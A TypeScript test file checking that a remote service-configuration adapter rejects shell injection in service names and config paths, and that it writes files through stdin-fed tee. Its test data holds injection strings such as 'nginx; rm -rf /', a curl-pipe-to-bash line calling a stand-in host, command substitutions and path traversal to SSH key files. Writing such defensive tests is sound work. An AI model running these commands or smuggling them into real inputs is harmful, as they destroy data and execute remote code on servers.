// ============================================================
// RHODES — SystemAdapter.configureService security tests
//
// Covers security finding C-1 (HIGH) from
// docs/audits/security-2026-05-14.md: `service` and `config_path`
// were shell-interpolated into the constructed remote command,
// allowing command injection. The fix layers strict input
// validation against the SSH safety classifier and replaces the
// `cat > '${path}'` redirect with a stdin-fed `tee`.
// ============================================================

import { describe, it, expect, beforeEach, vi } from "vitest";
import { SystemAdapter } from "../../src/providers/system/adapter.js";

describe("SystemAdapter.configureService — security C-1 HIGH", () => {
  let adapter: SystemAdapter;

  beforeEach(async () => {
    adapter = new SystemAdapter();
    await adapter.connect();
  });

  // ── service-name injection ──────────────────────────────────

  it("rejects service names containing shell metacharacters", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");

    const malicious = [
      "nginx; rm -rf /",
      "nginx && curl evil.sh | bash",
      "nginx || whoami",
      "nginx `id`",
      "nginx $(whoami)",
      "nginx | tee /tmp/x",
      "nginx > /etc/shadow",
      "nginx\nrm -rf /",
      "nginx 'quoted'",
      'nginx "double-quoted"',
      "nginx\\bash",
    ];

    for (const service of malicious) {
      const result = await adapter.execute("configure_service", {
        host: "10.0.0.10",
        service,
        action: "restart",
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(
        /systemd-allowed|null bytes|exceeds 128/,
      );
    }

    // Most importantly: nothing was ever shelled out.
    expect(runProcess).not.toHaveBeenCalled();
  });

  it("rejects empty service name", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");
    const result = await adapter.execute("configure_service", {
      host: "10.0.0.10",
      service: "",
    });
    expect(result.success).toBe(false);
    expect(result.error).toContain("host and service are required");
    expect(runProcess).not.toHaveBeenCalled();
  });

  it("rejects service names with null bytes", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");
    const result = await adapter.execute("configure_service", {
      host: "10.0.0.10",
      service: "nginx\0rm",
    });
    expect(result.success).toBe(false);
    expect(result.error).toContain("null bytes");
    expect(runProcess).not.toHaveBeenCalled();
  });

  it("rejects overly long service names", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");
    const result = await adapter.execute("configure_service", {
      host: "10.0.0.10",
      service: "a".repeat(200),
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/exceeds 128/);
    expect(runProcess).not.toHaveBeenCalled();
  });

  // ── config_path injection ───────────────────────────────────

  it("rejects config_path outside allowed prefixes", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");

    const outsidePrefixes = [
      "/tmp/foo.conf",
      "/home/attacker/.ssh/authorized_keys",
      "/root/.bashrc",
      "/proc/sys/something",
    ];

    for (const config_path of outsidePrefixes) {
      const result = await adapter.execute("configure_service", {
        host: "10.0.0.10",
        service: "nginx",
        config_path,
        config_content: "x",
        action: "restart",
      });
      expect(result.success).toBe(false);
      expect(result.error).toMatch(/outside the allowed prefixes/);
    }

    expect(runProcess).not.toHaveBeenCalled();
  });

  it("rejects config_path with shell metacharacters", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");

    const malicious = [
      "/etc/nginx/nginx.conf'; rm -rf /; echo '",
      "/etc/nginx/$(id).conf",
      "/etc/nginx/`whoami`.conf",
      "/etc/nginx/nginx.conf; rm",
      "/etc/nginx/nginx.conf | cat",
      "/etc/nginx/\"quoted\"",
      "/etc/nginx/nginx.conf\nrm",
    ];

    for (const config_path of malicious) {
      const result = await adapter.execute("configure_service", {
        host: "10.0.0.10",
        service: "nginx",
        config_path,
        config_content: "x",
        action: "restart",
      });
      expect(result.success).toBe(false);
      expect(result.error).toMatch(
        /outside the allowed set|outside the allowed prefixes|null bytes|exceeds 512/,
      );
    }

    expect(runProcess).not.toHaveBeenCalled();
  });

  it("rejects config_path with path-traversal segments", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");
    const result = await adapter.execute("configure_service", {
      host: "10.0.0.10",
      service: "nginx",
      config_path: "/etc/nginx/../../root/.ssh/authorized_keys",
      config_content: "x",
      action: "restart",
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/\.\..*refused/);
    expect(runProcess).not.toHaveBeenCalled();
  });

  it("rejects config_path with null bytes", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");
    const result = await adapter.execute("configure_service", {
      host: "10.0.0.10",
      service: "nginx",
      config_path: "/etc/nginx/foo\0.conf",
      config_content: "x",
      action: "restart",
    });
    expect(result.success).toBe(false);
    expect(result.error).toContain("null bytes");
    expect(runProcess).not.toHaveBeenCalled();
  });

  it("requires both config_path and config_content together", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");
    const result = await adapter.execute("configure_service", {
      host: "10.0.0.10",
      service: "nginx",
      config_path: "/etc/nginx/foo.conf",
      // config_content omitted
      action: "restart",
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/config_path and config_content/);
    expect(runProcess).not.toHaveBeenCalled();
  });

  // ── action allowlist ────────────────────────────────────────

  it("rejects unknown action verbs", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");
    const result = await adapter.execute("configure_service", {
      host: "10.0.0.10",
      service: "nginx",
      action: "delete-all-the-things",
    });
    expect(result.success).toBe(false);
    expect(result.error).toContain("Unknown action");
    expect(runProcess).not.toHaveBeenCalled();
  });

  // ── happy path: classifier-friendly per-step execution ──────

  it("legitimate restart issues per-step ssh calls, classifier passes", async () => {
    const runProcess = vi
      .spyOn(adapter as any, "runProcess")
      .mockResolvedValue({
        success: true,
        data: { stdout: "ok", stderr: "", exitCode: 0 },
      });

    const result = await adapter.execute("configure_service", {
      host: "10.0.0.10",
      service: "nginx",
      action: "restart",
    });

    expect(result.success).toBe(true);
    // restart → 2 steps: systemctl restart nginx + systemctl status nginx --no-pager
    expect(runProcess).toHaveBeenCalledTimes(2);

    // Inspect the actual remote commands — they must NOT chain.
    const allCommands = runProcess.mock.calls.map(
      (call) => (call[1] as string[])[call[1].length - 1],
    );
    for (const cmd of allCommands) {
      expect(cmd).not.toContain("&&");
      expect(cmd).not.toContain("||");
      expect(cmd).not.toContain(";");
      expect(cmd).not.toContain("|");
    }

    expect(allCommands[0]).toBe("systemctl restart nginx");
    expect(allCommands[1]).toBe("systemctl status nginx --no-pager");

    // Returned data exposes per-step tier classifications for audit.
    const data = result.data as { steps: Array<{ step: string; tier: string }> };
    expect(data.steps[0].tier).toBe("risky_write");
    expect(data.steps[1].tier).toBe("read");
  });

  it("legitimate enable_and_start issues three classifier-friendly steps", async () => {
    const runProcess = vi
      .spyOn(adapter as any, "runProcess")
      .mockResolvedValue({
        success: true,
        data: { stdout: "ok", stderr: "", exitCode: 0 },
      });

    const result = await adapter.execute("configure_service", {
      host: "10.0.0.10",
      service: "nginx",
      action: "enable_and_start",
    });

    expect(result.success).toBe(true);
    expect(runProcess).toHaveBeenCalledTimes(3);
    const commands = runProcess.mock.calls.map(
      (call) => (call[1] as string[])[call[1].length - 1],
    );
    expect(commands).toEqual([
      "systemctl enable nginx",
      "systemctl start nginx",
      "systemctl status nginx --no-pager",
    ]);
  });

  it("legitimate config-write path uses tee with stdin (no shell-interpolated cat-redirect)", async () => {
    const runProcess = vi
      .spyOn(adapter as any, "runProcess")
      .mockResolvedValue({
        success: true,
        data: { stdout: "", stderr: "", exitCode: 0 },
      });

    const result = await adapter.execute("configure_service", {
      host: "10.0.0.10",
      service: "nginx",
      config_path: "/etc/nginx/sites-available/api.conf",
      config_content: "server { listen 80; }",
      action: "restart",
    });

    expect(result.success).toBe(true);

    // mkdir + tee + restart + status = 4 calls.
    expect(runProcess).toHaveBeenCalledTimes(4);

    // Commands per call.
    const commands = runProcess.mock.calls.map(
      (call) => (call[1] as string[])[call[1].length - 1],
    );

    // 1. mkdir with quoted dir, no shell substitution.
    expect(commands[0]).toBe("mkdir -p '/etc/nginx/sites-available'");
    expect(commands[0]).not.toContain("$(");
    expect(commands[0]).not.toContain("dirname");

    // 2. tee with the quoted path. CRITICALLY: no `cat > '${path}'`
    //    interpolation, no heredoc on the agent side. Content is
    //    streamed via stdin (the fourth runProcess argument).
    expect(commands[1]).toBe(
      "tee '/etc/nginx/sites-available/api.conf' >/dev/null",
    );
    const teeStdin = runProcess.mock.calls[1][3];
    expect(teeStdin).toBe("server { listen 80; }");

    // 3, 4. systemctl restart + status, no chaining.
    expect(commands[2]).toBe("systemctl restart nginx");
    expect(commands[3]).toBe("systemctl status nginx --no-pager");

    // Spot-check: not one of these should look like the pre-fix
    // `cat > '${configPath}' << 'RHODES_EOF'` form.
    for (const cmd of commands) {
      expect(cmd).not.toMatch(/cat\s*>/);
      expect(cmd).not.toMatch(/RHODES_EOF/);
    }
  });

  it("accepts all allowed config_path prefixes", async () => {
    const runProcess = vi
      .spyOn(adapter as any, "runProcess")
      .mockResolvedValue({
        success: true,
        data: { stdout: "", stderr: "", exitCode: 0 },
      });

    const prefixes = [
      "/etc/foo/bar.conf",
      "/var/lib/foo/config",
      "/usr/local/etc/foo.conf",
      "/opt/myapp/config.toml",
      "/srv/foo/bar.yml",
    ];

    for (const config_path of prefixes) {
      runProcess.mockClear();
      const result = await adapter.execute("configure_service", {
        host: "10.0.0.10",
        service: "nginx",
        config_path,
        config_content: "x",
        action: "status",
      });
      expect(result.success).toBe(true);
    }
  });

  it("allows systemd-style instance and templated service names", async () => {
    const runProcess = vi
      .spyOn(adapter as any, "runProcess")
      .mockResolvedValue({
        success: true,
        data: { stdout: "", stderr: "", exitCode: 0 },
      });

    const validNames = [
      "nginx",
      "docker",
      "ssh.service",
      "getty@tty1",
      "dbus-broker",
      "user_session",
      "foo:bar",
    ];

    for (const service of validNames) {
      runProcess.mockClear();
      const result = await adapter.execute("configure_service", {
        host: "10.0.0.10",
        service,
        action: "status",
      });
      expect(result.success).toBe(true);
    }
  });

  it("returns safe error for null/undefined inputs", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");

    const r1 = await adapter.execute("configure_service", {});
    expect(r1.success).toBe(false);
    expect(r1.error).toContain("host and service are required");

    const r2 = await adapter.execute("configure_service", {
      host: "10.0.0.10",
    });
    expect(r2.success).toBe(false);
    expect(r2.error).toContain("host and service are required");

    const r3 = await adapter.execute("configure_service", {
      host: "10.0.0.10",
      service: null as unknown as string,
    });
    expect(r3.success).toBe(false);

    const r4 = await adapter.execute("configure_service", {
      host: "10.0.0.10",
      service: undefined as unknown as string,
    });
    expect(r4.success).toBe(false);

    expect(runProcess).not.toHaveBeenCalled();
  });
});
